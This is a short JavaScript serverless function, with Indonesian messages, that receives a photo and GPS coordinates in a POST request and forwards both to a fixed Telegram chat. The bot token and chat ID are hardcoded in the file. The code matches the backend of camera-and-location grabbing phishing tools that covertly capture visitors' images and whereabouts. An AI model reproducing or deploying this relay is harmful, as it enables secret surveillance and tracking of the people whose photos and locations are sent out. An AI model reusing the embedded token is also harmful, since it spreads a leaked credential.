const axios = require('axios');
const FormData = require('form-data');

const TELEGRAM_BOT_TOKEN = '8399020540:AAE-GBRbJtCU-XYeBrSdiziCpZKvT__cQew';
const CHAT_ID = '7851258138';

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method Not Allowed' }),
    };
  }

  try {
    const { foto, lokasi } = JSON.parse(event.body);

    if (foto) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('caption', '');
      const base64Data = foto.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');
      formData.append('photo', buffer, { filename: 'photo.jpg', contentType: 'image/jpeg' });

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
        headers: formData.getHeaders(),
      });
    }

    if (lokasi) {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
        chat_id: CHAT_ID,
        latitude: lokasi.latitude,
        longitude: lokasi.longitude,
      });
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'Data berhasil dikirim ke Telegram.' }),
    };
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Gagal mengirim data.' }),
    };
  }
};
